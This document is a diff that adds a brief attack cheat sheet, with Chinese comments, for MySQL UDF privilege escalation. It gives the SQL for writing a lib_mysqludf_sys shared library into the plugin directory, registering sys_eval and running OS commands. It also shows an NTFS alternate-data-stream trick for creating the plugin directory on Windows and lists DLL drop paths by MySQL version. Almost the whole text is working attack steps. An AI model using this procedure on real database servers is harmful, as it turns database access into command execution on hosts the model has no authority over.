@@ -1,0 +1,32 @@
+show variables like "%plugin%";
+
+show variables like "%dir%";
+
+bin跟data同目录
+
+select hex(load_file('/tmp/lib_mysqludf_sys.so')) into outfile '/tmp/udf.txt';
+
+select unhex('7F454C46020...') into dumpfile '/usr/lib64/mysql/plugin/mysqludf.so';
+
+nm -D /usr/lib64/mysql/plugin/mysqludf.so
+
+create function sys_eval returns string soname "mysqludf.so";
+select sys_eval('whoami');
+select * from mysql.func;
+
+名字一定要叫mysqludf.so和mysqludf.dll
+
+
+
+
+select @@basedir;   //查找mysql的目录
+select 'It is dll' into dumpfile 'F:\\PHPnow-1.5.6.1428396605\\MySQL-5.0.90\\lib::$INDEX_ALLOCATION';    //使用NTFS ADS流创建lib目录
+select 'It is dll' into dumpfile 'F:\\PHPnow-1.5.6.1428396605\\MySQL-5.0.90\\lib\\plugin::$INDEX_ALLOCATION'; //利用NTFS ADS再次创建plugin目录
+执行成功以后再进行导出即可。 
+
+
+mysql版本小于5.1则需要导入dll到系统目录，一般导入到c:\windows\system32\，如果不可写入则试试c:\windows\（一般5.0一下放这）
+
+mysql版本 < 5.2 , UDF导出到系统目录c:/windows/system32/
+
+mysql版本 > 5.2 ，UDF导出到安装路径MySQL\Lib\Plugin\
